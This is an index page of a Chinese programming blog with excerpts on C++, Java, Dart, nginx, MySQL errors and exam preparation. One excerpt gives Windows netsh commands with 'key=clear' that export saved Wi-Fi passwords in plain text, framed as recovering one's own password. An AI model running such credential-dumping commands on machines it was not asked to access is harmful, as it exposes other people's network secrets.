<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6cfdeea14f34b0b1a8b13762e9fcac93/" rel="bookmark">
			银行排队模拟（队列）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		银行排队模拟程序 队列类Queue
#ifndef QUEUE_H #define QUEUE_H struct Record //顾客结构体 { int ArrivedTime; //顾客到达时间 int CostTime; //顾客办理时间 int Num; //顾客编号 }; const int QueueSize=10; class Queue { public: Queue(); //构造函数 virtual ~Queue(); //析构函数 void addFirst(int x,int y,int z); //入队 int popLast(); //出队 int Getqueue1(); //获取队头元素的到达时间 int Getqueue2(); //获取队头元素的办理时间 int Getqueue3(); //获取队头元素的编号 bool Empty(){ if(front==rear) return true; else return false; } Record data[QueueSize]; int front,rear; }； #endif #include "Queue.h" #include&lt;stdio.h&gt; #include&lt;stdlib.h&gt; Queue::Queue() { //ctor int data=(int)malloc(2*sizeof(QueueSize)); front=rear=QueueSize-1; } Queue::~Queue() { //dtor delete []data; } void Queue::addFirst(int x,int y,int z) { if((rear+1)%QueueSize==front) throw"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6cfdeea14f34b0b1a8b13762e9fcac93/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bbaefb031be0f7d3b47b5f8fa7aca31a/" rel="bookmark">
			【Http】关于Http请求头中的Content-type问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题描述： 在Android中使用OkHttp向服务端post一个json时，服务端一直返回无法获取到参数。
具体表现： 前两天参加一个移动互联网的比赛的时候，在代码中使用OkHttp向局域网内的服务器发送一个post请求时，服务器一直返回无法获取到参数。Android端中请求的代码如下：
OkHttpClient client = new OkHttpClient(); RequestBody body = new FormBody.Builder() .add("a", "a") .add("b", "1") .build(); Request request = new Request.Builder() .url("http://...") .post(body) .build(); client.newCall(request).enqueue(new Callback() { @Override public void onFailure(Call call, IOException e) { ... } @Override public void onResponse(Call call, Response response) throws IOException { ... } }); 由于技术比较菜，所以一直以来OkHttp发送json的时候是用FormBody来做的，而且在之前的与服务器的交互中都没有出现过类似的问题。所以在比赛的时候突然遇到，一直以为是服务端的原因。后来比赛完后，我的指导老师帮我分析时提到了：Content-type这个请求头的问题，我才心里有点清楚大概是什么原因。
通过查看FormBody的源码的时候发现，在其第一行就很明显的写明了Content-type的值：
public final class FormBody extends RequestBody { private static final MediaType CONTENT_TYPE = MediaType.get("application/x-www-form-urlencoded"); private final List&lt;String&gt; encodedNames; private final List&lt;String&gt; encodedValues; FormBody(List&lt;String&gt; encodedNames, List&lt;String&gt; encodedValues) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bbaefb031be0f7d3b47b5f8fa7aca31a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5af831927c15a553d1fcde60c15dd155/" rel="bookmark">
			hpp文件介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是hpp文件 以往在编写 C++ 程序时，如果需要分模块，一般我们是编写一个 .h 文件，在里面放上函数的声明，再编写一个 .cpp 文件，在里面添加函数的相关实现，这样子在使用的时候包含头文件，再把 .cpp 加到当前工程下编译即可，如果此时 .cpp 忘记添加到当前工程下编译，经常就会出现函数找不到的情况。如果你的 .h 是模板类的声明，.cpp 是模板类函数的实现，由于模板两次编译的机制，直接包含头文件就出现找不到函数的情况了，这种情况需要把实现和声明放在一起，才能找到函数的定义。
hpp（Header Plus Plus）头文件，顾名思义就是 .h 文件加上 .cpp 文件，在 boost 开源库中频繁出现，其实就是 .cpp 实现代码混入 .h 文件当中，定义和实现都包含在同一个文件里。
使用hpp文件的好处 1.hpp 文件将定义和实现放在同一个文件，减少了文件的数量
2.无需再将 cpp 加入到项目中进行编译，将代码直接编译到调用者的 obj 文件，不再生成单独的 obj，大幅度减少编译次数，非常适合编写开源库
3.boost 库大量使用模板，采用 hpp 的形式可以保持与各个编译器更好的兼容性（C++ 模板不能把源文件和声明文件分开成两个文件）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3aff823fcbb1a16aa245f783797540fc/" rel="bookmark">
			L1-056 猜数字-java
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		L1-056 猜数字 （20 分)
一群人坐在一起，每人猜一个 100 以内的数，谁的数字最接近大家平均数的一半就赢。本题就要求你找出其中的赢家。
输入格式：
输入在第一行给出一个正整数N（≤10​4​​）。随后 N 行，每行给出一个玩家的名字（由不超过8个英文字母组成的字符串）和其猜的正整数（≤ 100）。
输出格式：
在一行中顺序输出：大家平均数的一半（只输出整数部分）、赢家的名字，其间以空格分隔。题目保证赢家是唯一的。
输入样例：
7 Bob 35 Amy 28 James 98 Alice 11 Jack 45 Smith 33 Chris 62 输出样例：
22 Amy 代码实现：
import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.util.HashMap; import java.util.Map; public class Main { public static void main(String[] args) throws Exception { BufferedReader in = new BufferedReader(new InputStreamReader(System.in)); int n = Integer.parseInt(in.readLine()); Map&lt;String, Integer&gt; map = new HashMap&lt;String, Integer&gt;(); int sum = 0; String name = null; for (int i = 0; i &lt; n; i++) { String[] str = in.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3aff823fcbb1a16aa245f783797540fc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/149256f3d62d7d4c5f7f9ae744afb1d9/" rel="bookmark">
			什么是程序？什么是程序设计？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		程序是一组计算机能够识别的指令。每一条指令使计算机执行特定的操作，只要执行这个操作，计算机就会“自动”的完成其它指令。使其成为你要实现的功能!
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9eddc251c4be484103a21a67c8a05933/" rel="bookmark">
			MySQL插入数据出错及解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目中对MySQL插入数据的时候，出现错误信息，查阅网上相关文章后解决，记录之，下次供参考。
错误提示一：MySQLIntegrityConstraintViolationException ### Error updating database. Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLIntegrityConstraintViolationException: Unknown error 1048 ### The error may involve com.tyron.task.dao.RegisterMapper.addRegister-Inline ### The error occurred while setting parameters 错误原因：在插入数据时，数据库指定字段非空，但是插入了空内容，导致出错。
解决方法：
将字段设置为可为空将字段设值后再插入，进行非空判断 错误提示二：MysqlDataTruncation Cause: com.mysql.jdbc.MysqlDataTruncation: Data truncation: #22001 错误原因：插入的数据字段长度超过了数据库字段的限定长度
解决方案：适当扩大数据库字段长度
以上错误均出于实际生产环境，可能我们报错的内容相同，但是出错的原因不同，以上的解决方案仅供参考，如能对你有帮助，灰常荣幸。
附上：mysql 错误代码大全
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d16d695be6075da81a94a896ba7d4b2/" rel="bookmark">
			明码进制转换(模拟)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		汉字的字形存在于字库中，即便在今天，16点阵的字库也仍然使用广泛。
16点阵的字库把每个汉字看成是16x16个像素信息。并把这些信息记录在字节中。一个字节可以存储8位信息，用32个字节就可以存一个汉字的字形了。把每个字节转为2进制表示，1表示墨迹，0表示底色。每行2个字节，一共16行，布局是：
第1字节，第2字节
第3字节，第4字节
…
第31字节, 第32字节
这道题目是给你一段多个汉字组成的信息，每个汉字用32个字节表示，这里给出了字节作为有符号整数的值。
题目的要求隐藏在这些信息中。你的任务是复原这些汉字的字形，从中看出题目的要求，并根据要求填写答案。
这段信息是（一共10个汉字）:
4 0 4 0 4 0 4 32 -1 -16 4 32 4 32 4 32 4 32 4 32 8 32 8 32 16 34 16 34 32 30 -64 0 16 64 16 64 34 68 127 126 66 -124 67 4 66 4 66 -124 126 100 66 36 66 4 66 4 66 4 126 4 66 40 0 16 4 0 4 0 4 0 4 32 -1 -16 4 32 4 32 4 32 4 32 4 32 8 32 8 32 16 34 16 34 32 30 -64 0 0 -128 64 -128 48 -128 17 8 1 -4 2 8 8 80 16 64 32 64 -32 64 32 -96 32 -96 33 16 34 8 36 14 40 4 4 0 3 0 1 0 0 4 -1 -2 4 0 4 16 7 -8 4 16 4 16 4 16 8 16 8 16 16 16 32 -96 64 64 16 64 20 72 62 -4 73 32 5 16 1 0 63 -8 1 0 -1 -2 0 64 0 80 63 -8 8 64 4 64 1 64 0 -128 0 16 63 -8 1 0 1 0 1 0 1 4 -1 -2 1 0 1 0 1 0 1 0 1 0 1 0 1 0 5 0 2 0 2 0 2 0 7 -16 8 32 24 64 37 -128 2 -128 12 -128 113 -4 2 8 12 16 18 32 33 -64 1 0 14 0 112 0 1 0 1 0 1 0 9 32 9 16 17 12 17 4 33 16 65 16 1 32 1 64 0 -128 1 0 2 0 12 0 112 0 0 0 0 0 7 -16 24 24 48 12 56 12 0 56 0 -32 0 -64 0 -128 0 0 0 0 1 -128 3 -64 1 -128 0 0 注意：需要提交的是一个整数，不要填写任何多余内容。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9d16d695be6075da81a94a896ba7d4b2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fcdd87b418e060ebcf2340e0737f21b7/" rel="bookmark">
			Dart语言——45分钟快速入门（下）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Dart 入门到深入路线图：
Dart语言——45分钟快速入门（上）
Dart语言——45分钟快速入门（下）
Dart 异步编程详解之一文全懂
Dart 语言异步之Stream详解
Dart 语言标准流与文件操作
Dart 网络编程
Dart 爬虫开发体验
Dart 全栈之服务端开发
Dart FFI调用C语言混合编程
LuaDardo中Dart与Lua的相互调用
关注我，不错过！
文章目录 类和对象类的定义Getters 和 Setters方法构造方法命名构造方法常量构造方法工厂构造方法构造方法重定向 类的初始化列表运算符重载类的继承接口抽象抽象类隐式接口 泛型异常处理库与导入异步编程 视频课程 类和对象 类的定义 // Dart中定义一个类 class Person { String name; int age; Person(String name, int age) { this.name = name; this.age = age; } } Dart中的类与Java中的相似，不同的是，Dart中没有private、public这些成员访问修饰符。如果是类私有的成员，不希望外面访问，只需要在成员变量之前加上一个下划线_变为私有即可。
以上代码，在Dart中还有一种简化写法，可以自动在构造方法中对成员变量初始化。
// Dart中定义一个类 class Person { String name; int age; // 在构造方法中初始化成员变量时，可使用如下写法简化 Person(this.name, this.age); // 如需处理其他变量时，也可单独对其操作 // Person(this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fcdd87b418e060ebcf2340e0737f21b7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15f82adda072d6a78ba92f8233adcc01/" rel="bookmark">
			CRNN&#43;CTC (基于CTPN 的end-to-end OCR)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. https://zhuanlan.zhihu.com/p/43534801 (详细原理)
2. https://blog.csdn.net/forest_world/article/details/78566737 (代码模型)
3.https://www.cnblogs.com/skyfsm/p/10335717.html （详细原理+）
4. https://www.cnblogs.com/liaohuiqiang/p/9953978.html （详细原理+，涉及了CTC预测过程）
转载于:https://www.cnblogs.com/liutianrui1/p/10578467.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/089931a7066acb3cf8e52326be5fdca6/" rel="bookmark">
			Java 12 新特性之JEP 325: Switch Expressions (Preview)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 背景 Java中switch的语法长期被人诟病，尤其在scala中强大的case关键字对于类型匹配、顺序匹配、对象深度匹配、正则匹配、函数式的支持衬托下，更显得相形见拙。
因此对于switch的改造在很早的时候就提上日程了，终于到了Java 12中，switch的新表达式作为preview feature交付了。
2. 功能描述 作为preview feature，默认情况下是无法编译的，需要通过JVM参数enable-preview打开preview feature。
使用 javac --enable-preview --release 编译使用 java --enable-preview 执行 2.1 fall-through语义的改进 长期以来，Java switch语句的设计遵循C和cpp语言，并默认支持fall-through语义。虽然这种传统恩控制流通常用于编写低级代码。但是由于switch用于更高级的上下文，它变得非常容易出错，如下面的示例
switch (letter) { case "A": case "B": case "C": System.out.println("ABC"); break; case "D": System.out.println("D_1"); break; case "E": case "F": System.out.println("EF"); break; case "G": System.out.println("G_1"); break; default: System.out.println("DEFAULT"); break; } 在Java 12中，可以被优化为下面的样式
switch (letter) { case "A", "B", "C" -&gt; System.out.println("ABC"); case "D" -&gt; System.out.println("D_1"); case "E", "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/089931a7066acb3cf8e52326be5fdca6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5853ac0101e7d7a4bf23e63577126538/" rel="bookmark">
			四种常见游戏循环实现方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最基本的游戏循环bool game_is_running = true; while（game_is_running）{ update_game（）执行; display_game（）; } 问题在于上述简单循环没有时间处理部分。关于游戏循环事件的术语： FPS:FPS是Frames Per Second的缩写。在上述实现的上下文中，它是每秒调用display_game（）的次数。游戏速度:游戏状态每秒更新的次数，换句话说，就是每秒调用update_game（）的次数。 方案一：FPS依赖于恒定游戏速度const int FRAMES_PER_SECOND = 25; //恒定的帧数 const int SKIP_TICKS = 1000 / FRAMES_PER_SECOND; DWORD next_game_tick = GetTickCount(); // GetTickCount() returns the current number of milliseconds // that have elapsed since the system was started int sleep_time = 0; bool game_is_running = true; while( game_is_running ) { update_game(); display_game(); next_game_tick += SKIP_TICKS; sleep_time = next_game_tick - GetTickCount(); if( sleep_time &gt;= 0 ) { Sleep( sleep_time ); } else { // Shit, we are running behind!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5853ac0101e7d7a4bf23e63577126538/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0d21abe014b4e5cdff15960fb36e77c/" rel="bookmark">
			stackoverflow.com 秒开
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		stackoverflow 打开缓慢，这个问题怎么破？ - 404一Not一Found的回答 - 知乎 https://www.zhihu.com/question/22909851/answer/124997521
原因是stackoverflow用了谷歌CDN
Local CDN
链接: https://pan.baidu.com/s/17_siDRqGfpQ5cBGDTt3Eyg
提取码: 6h3f 安装方法
chrome://downloads
chrome://extensions
把插件从downloads拉至extensions
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da6d6640cac334760a1a99cb01251952/" rel="bookmark">
			python获取上一层文件夹路径
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://www.cnblogs.com/yajing-zh/p/6807968.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46e1f57176e0239d5d1735b588aadc28/" rel="bookmark">
			visual studio code 代码如何换行?
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、打开vs code界面，点击File
2、preferences
3、settings
4、User settings
5、Editor：World Wrap
6、off--&gt;on
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/334167dd5dbe30109a415283fd375a0e/" rel="bookmark">
			使用相对路径在html中插入本地图片的办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		html中有个语句用来插入图片到网页：
&lt;img src=" "/&gt;
我们如果想插入一张网页图片的话，网页图片经常不允许复制。插入本地图片，按照图片的路径去填写，还经常遇到图片无法显示的情况，这是为什么呢?
这里，小编分享一下用相对路径在html中插入本地图片的办法：
把想要插入的本地图片放到运行的html文件相同的路径，如下图：
然后，代码中直接输入图片名字+扩展名即可将图片展示在网页中。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70d037f8b8716f331ac87d8656fa2fbd/" rel="bookmark">
			macOs中android源码下载及编译过程问题总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		产考资源
源码下载官方参考地址：https://source.android.com/source/downloading.html
源码版本官方产考地址：https://source.android.com/source/build-numbers.html#source-code-tags-and-builds
清华镜像源下载产考地址：https://mirrors.tuna.tsinghua.edu.cn/help/AOSP
下载过程遇到的问题
1. fatal: Cannot get https://gerrit.googlesource.com/git-repo/clone.bundle 解决办法有两种:
采用清华镜像源代替，详情请点击这里，总之执行如下命令即可：
repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b 请替换对应的android版本号如果有vpn，设置git下载代理：git config --global http.proxy "代理ip地址:端口号" ，重试即可。 2. gpg (GnuPG) is not available 解决办法： 请点击这里安装GunPG
编译过程遇到的问题
1. internal error: Could not find a supported mac sdk: [“10.10” “10.11” “10.12”] 缺少对应版本的sdk，这里给出两种解决办法：
查找mac sdk版本，执行命令:ls /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/
如图：
然后build/soong目录按文件内容搜索"10.10"，找到了文件bulid/soong/cc/config/x86_darwin_host.go文件，只需修改对应内容即可，如图：
请点击这里下载对应sdk,解压并复制到
/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/目录下，重新编译即可。 2. build/core/config.mk:663: error: Error: could not find jdk tools.jar at /System/Library/Frameworks/JavaVM.framework/Versions/Current/Commands/…/lib/tools.jar, please check if your JDK was installed correctly.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/70d037f8b8716f331ac87d8656fa2fbd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e0f0380fa2135344b29bf461790d9fd7/" rel="bookmark">
			机器学习笔记：Supervised Learning and Unsupervised Learning
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Supervised Learning（监督学习）: 监督学习明显的特点就是训练所用的数据已经人为给定了标签（Labels），这样程序训练过程中就会根据所给的标签进行学习，换句话说就是顺着程序员想要的方向进行学习。常见的例子有一些识别问题，比如根据已标注的图片学习分类。
Unsupervised Learning（非监督学习）： 非监督学习恰恰与监督学习相反，我有一堆数据，我自己也不知道这些数据具有什么特点，我需要程序帮我进行聚类（Clustering），把具有相似特征的数据划分到一起。常见的应用场景为数据挖掘，比如某公司收集了自己用户的使用习惯数据，想要把具有相似偏好的用户划分到一起，这时候就能用到非监督学习。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a308bc987b00cc77d0dc1af9606a2b93/" rel="bookmark">
			80端口无法访问 但其他端口正常
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先检查nginx能否正常启动
cd /usr/local/nginx/sbin
./nginx -s reload //热更新 出现以下报错
nginx: [emerg] "tcp_nodelay" directive is duplicate in /usr/local/nginx/conf/nginx.conf:41 nginx: [error] open() "/usr/local/nginx/logs/nginx.pid" failed (2: No such file or directory) 打开nginx配置文件
vi /usr/local/nginx/conf/nginx.conf 注释以下出错行
41行报错 #tcp_nodelay on; 然后指定nginx配置文件目录
/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf 再次热更新nginx 查看有无报错
转载于:https://www.cnblogs.com/zhoupeng-php/p/10570096.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/058f5a5b35f3f1e4f8f7069ad3b6f398/" rel="bookmark">
			二叉树建立
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		结束二叉树输入：如何结束创建二叉树的输入那；把二叉树补全
前序（输入）：AB##C##
中序：#B#A#C#
后序：##B##CA
输出结果如下：
代码如下
#include&lt;iostream&gt; using namespace std; //定义节点 typedef struct node { struct node *left; struct node *right; char data; }BiTreeNode, *BiTree; //按照前序顺序建立二叉树 void createBiTree(BiTree &amp;T) {//输入需要将二叉树补成满二叉树 ABD##E##CH### 或者 AB##C## char c; cin &gt;&gt; c; if ('#' == c) //当遇到#时，令树的根节点为NULL，从而结束该分支的递归 T = NULL; else { T = new BiTreeNode; T-&gt;data = c; createBiTree(T-&gt;left); createBiTree(T-&gt;right); } } //前序遍历输出 void preTraverse(BiTree T) { if (T) { cout &lt;&lt; T-&gt;data &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/058f5a5b35f3f1e4f8f7069ad3b6f398/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/59ba78604fea21c9c72348d9e1fca296/" rel="bookmark">
			【Linux】Shell相关-美元符号的多种用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		总结一哈
$0 shell的命令本身(包括完整路径) $1到$9 数字表示shell 的第几个参数 $# 传递到脚本的参数个数 $* 以一个单字符串显示所有向脚本传递的参数 $$ 脚本运行的ID号 $! 后台运行的最后一个进程的ID号 $@ 与$*相同。 $- 显示shell使用的当前选项。 $? 显示最后命令的执行状况。0表示没有错误。 [qingxu@v020170 /tmp]$ ./test.sh p1 p2 $0 is { ./test.sh } $1 is { p1 } $2 is { p2 } $* is { p1 p2 } $@ is { p1 p2 } $# is { 2 } $! is { } $$ is { 25643 } $? is { 0 } 来自：Linux Shell中的美元符号$
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/59ba78604fea21c9c72348d9e1fca296/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c7949089be596fda9294622454dbe977/" rel="bookmark">
			响应式布局，仅小屏使用的css代码示例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 若HTML页面需要响应式布局，适应手机等，则需要下面两个标签
&lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;
&lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
响应式的css代码，当屏幕宽度小于768px时执行下面的css代码，写注释可能会影响
@media screen and (max-width: 768px) {
.navbar-nav {
background-color: rgba(77,2,2,1);
}
} 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0af66a738a40708c736bbefccd64918e/" rel="bookmark">
			笔记本已连接过的wifi密码忘记，如何查看？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景：笔记本已连接的密码忘记，想要找回密码，之前的win7电脑，可以勾选显示字符，就能查看到密码，但是电脑升级win10系统后，电脑密码就没法显示查看了。此时在网上发现一种方法，执行两条命令，在文件夹下生成一个wift配置文件，其中就能显示的看到我们所连接的wifi的密码。
win+r 输入 cmd 回车进入dos窗口。
命令1输入命令：netsh wlan show profiles
此命令作用，显示电脑曾经连接过的所有wifi名称，如图1.1
命令2输入命令：netsh wlan export profile name=TYFLH_2.4G folder=. key=clear
此命令作用，name=后面跟的是wifi名称，folder=后面跟的是生成文件目录名称 其中 .代表的是当前目录，即c:\Users\admin\
，在c:\Users\admin\目录下会生成一个WLAN-TYFLH_2.4G.xml文件，
如图2.1：
3.打开图2.1标红部分xml文件即可看到wifi密码。如图3.1
至此就可以知道之前忘记wifi的密码了。
命令3输入命令：
也可以通过命令：
netsh wlan show profiles 无线配置名称 key=clear
直接查看连接过的某个wifi 的密码 ，不用生成文件。
如下：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37fda6db631a2d50580339ea74b012b2/" rel="bookmark">
			C&#43;&#43; 指针常量、常量指针、指向指针常量的引用等
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 指针常量、常量指针、非常量引用与常量引用一、指针常量与常量指针（一）指针常量：（二）常量指针 ： 二、非常量引用与常量引用（一）引用的基础理论（非常量引用）：（二）常量引用： 指针常量、常量指针、非常量引用与常量引用 一、指针常量与常量指针 （一）指针常量： 辅助记忆，“指针是常量”
int val1=2; int* const p=&amp;val1;//	定义一个指针常量， 理解一： 指针常量即“指针是常量”，const修饰的是指针p，指针不可改变，如下例：
#include&lt;iostream&gt; using namespace std; int main(){ int val1 = 2; int val2 = 3; int* const p = &amp;val1; p = &amp;val2; } vs2017下编译错误：
注: 所谓左值非严格意义上来说可以理解为能取地址的表达式（例如 a+b就是非左值，是临时变量没有地址）
理解二： 指针虽然是常量但指针所指向的内容可修改，如下例：
#include&lt;iostream&gt; using namespace std; int main(){ int val1 = 2; int val2 = 3; int * const p = &amp;val1; cout &lt;&lt; *p &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/37fda6db631a2d50580339ea74b012b2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f97d4159f4000845d323f41f05b857bf/" rel="bookmark">
			df refresh磁盘没同步
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文件清理后，磁盘没及时同步。 事件： 发现 df 不足， 检查是某个日志太大， 于是删除日志， 再次 df -h 检查 磁盘。 发现没及时同步。
root@远盛09-GPU号(70-85-C2-88-27-97):/# df -h 文件系统 容量 已用 可用 已用% 挂载点 udev 3.9G 0 3.9G 0% /dev tmpfs 790M 70M 720M 9% /run /dev/sda1 32G 20G 11G 64% / tmpfs 3.9G 252K 3.9G 1% /dev/shm tmpfs 5.0M 4.0K 5.0M 1% /run/lock tmpfs 3.9G 0 3.9G 0% /sys/fs/cgroup /dev/sda2 174G 46G 120G 28% /data tmpfs 1000M 370M 631M 37% /data/tmp tmpfs 790M 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f97d4159f4000845d323f41f05b857bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4fcf5b930cbe1725b02592131ff617d6/" rel="bookmark">
			19跨考中科大计算机408经验贴
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写一下自己跨考408的一年，希望可以帮到需要的学弟学妹们～
简单介绍一下个人情况：
本科双非，专业是信息与计算科学，跨考中科大计算机科学技术专业，408里只学了一本数据结构，另外三本书自学，本科没项目，英语没什么基础，高中不学英语
考研成绩：
总分383，数一124，政治69，英语73，408专业课117
今年奇数年，408稍难，题目很新颖；数学比去年简单一点点，但其实也没有多简单～
今年浙大分数线好像是369上下吧，中科大340，但中科大360以下就很危险了，很多都被刷了，复试翻盘的也有但是很少，科大生源越来越好了，招的人却更少了，今年进复试87个，最终只录取了57个，复录比比往年都高
初试： 作息时间：
6：30 起床
7：00—8：00英语早读
8：00—11：30做数学题
11：30—12：00吃饭
12：30—13：00在图书馆睡午觉
13：00—14：00 有时候学数学，有时候学408，有时候学政治
14：00—17：30学408
19：00—20：30英语阅读
20：30—23：00九月以前英语，九月之后学政治
23: 00—23:30九月以后读背政治
基本上是这样，因为408课业比较重，我每天的学习时间比较久，九月之前的周末早上可能会多睡一个小时，考研后期晚上有时候八点才开始学学到十一点半
1.数学 数学我全程跟的汤家凤，但是我没有买汤老师的书，3月到6月做完一遍张宇的36讲，听的汤老师的基础班，做起来还是觉得有点难的
7月开始进入暑假，我开始做李永乐的复习全书，每天做20页，早上做不完的话中午睡完觉再多做一个小时，但是不能占用408的时间。记得我第一遍做的时候还是有点崩溃的，觉得很难，但是咬牙坚持下来了，做的时候在书上标记好哪些题自己会，哪些不会，不会的原因是什么，是粗心还是想不到思路。
